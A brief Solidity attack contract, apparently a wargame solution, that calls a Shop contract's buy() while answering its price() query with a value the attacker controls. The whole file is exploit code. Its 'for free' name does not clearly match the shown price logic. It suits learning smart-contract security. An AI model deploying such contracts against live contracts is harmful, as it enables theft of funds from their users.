// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Shop.sol';

contract BuyerContract {
  Shop shopContract;

  constructor(address _shopAddress) {
    shopContract = Shop(_shopAddress);
  }

  function buyItemForFree() public {
    shopContract.buy();
  }

  function price() public view returns (uint) {
    return shopContract.price() + 1;
  }

}